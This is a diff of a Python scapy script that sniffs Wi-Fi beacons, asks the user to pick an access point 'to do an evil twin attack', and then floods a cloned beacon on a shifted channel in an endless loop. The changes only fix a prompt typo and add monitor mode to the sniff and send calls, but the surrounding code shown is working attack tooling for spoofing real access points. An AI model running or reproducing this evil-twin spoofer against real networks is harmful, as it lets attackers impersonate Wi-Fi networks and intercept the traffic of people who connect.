@@ -7,8 +7,8 @@ from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
 pkt_full_list = []
 bssid_list = []
 counter = 0
-interface = input("Enter interface to listed on (must be on monitor mode : \n")
-print("APs will be listed here, wait 20s and choose one  :\n")
+interface = input("Enter interface to listed on (must be on monitor mode) : \n")
+print("APs will be listed here, wait 20s and choose one :\n")
 
 
 def pkt_callback(pkt):
@@ -36,7 +36,7 @@ def pkt_callback(pkt):
             print(counter, " : \t", bssid, " SSID : ", pkt[Dot11].info, " Channel : ", channel, "RSSI : ", dbm_signal)
 
 
-sniff(iface=interface, prn=pkt_callback, timeout=10)
+sniff(iface=interface, prn=pkt_callback, timeout=10, monitor=True)
 
 evilTwinTarget = input("Choose one of the AP to do an evil twin attack :\n")
 evilTwinTarget = int(evilTwinTarget)
@@ -70,4 +70,4 @@ newPkt = newPkt / Dot11Elt(ID="DSset", info=chr((channel + 6) % 13))
 newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
 print("New Channel : ", newChannel)
 
-sendp(newPkt, inter=0.01, loop=1, iface=interface)
+sendp(newPkt, inter=0.01, loop=1, iface=interface, monitor=True)
